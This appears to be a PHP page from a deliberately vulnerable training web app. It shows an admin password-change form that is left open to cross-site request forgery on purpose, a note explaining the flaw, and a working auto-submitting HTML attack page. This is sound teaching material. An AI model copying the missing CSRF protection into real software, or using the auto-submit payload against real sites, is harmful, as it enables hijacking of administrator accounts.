<?php
require_once '../../includes/config.php';
require_once '../../includes/db.php';
require_once '../../includes/functions.php';

// Simulated admin check
if (!isAdmin()) {
    header('Location: ../index.php');
    exit;
}

$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_password'])) {
    // VULNERABLE: No CSRF token
    $newPassword = $_POST['new_password'];
    $message = "Password changed to: $newPassword (not really, just a demo)";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Change Password - Vulnerable Demo</title>
    <link rel="stylesheet" href="../../assets/css/output.css">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto px-4 py-8">
        <h1 class="text-3xl font-bold text-blue-800 mb-6">Admin: Change Password</h1>
        
        <?php if ($message): ?>
            <div class="mb-4 p-4 bg-green-100 text-green-800 rounded">
                <?= htmlspecialchars($message) ?>
            </div>
        <?php endif; ?>

        <div class="bg-white rounded-lg shadow-md p-6 mb-6">
            <form method="POST">
                <div class="mb-4">
                    <label class="block text-gray-700 mb-2">New Password:</label>
                    <input type="password" name="new_password" class="border p-2 rounded w-full">
                </div>
                <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded">Change Password</button>
            </form>
        </div>

        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
            <p class="font-semibold">Vulnerability Note:</p>
            <p>This form is vulnerable to CSRF attacks. An attacker could trick an admin into submitting this form without their knowledge.</p>
        </div>

        <div class="bg-white rounded-lg shadow-md p-6">
            <h2 class="text-xl font-semibold mb-4">CSRF Attack Example</h2>
            <p>Create an HTML file with this content:</p>
            <pre class="bg-gray-200 p-4 rounded mt-2 overflow-x-auto">
&lt;html&gt;
&lt;body&gt;
    &lt;form action="http://yoursite.com/admin/change_password.php" method="POST"&gt;
        &lt;input type="hidden" name="new_password" value="hacked123"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
            <p class="mt-2">If an admin visits this page while logged in, their password would be changed.</p>
        </div>
    </div>
</body>
</html>